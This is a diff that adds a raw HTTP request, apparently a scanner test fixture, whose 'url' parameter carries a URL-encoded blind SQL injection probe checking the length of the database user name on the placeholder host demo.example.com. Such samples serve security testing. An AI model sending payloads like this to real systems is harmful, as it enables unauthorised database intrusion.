@@ -1,0 +1,4 @@
+GET /a?url=1%27%2Band%2B%28length%28user%28%29%29%3E0%29%23 HTTP/1.1
+Host: demo.example.com
+Connection: close
+
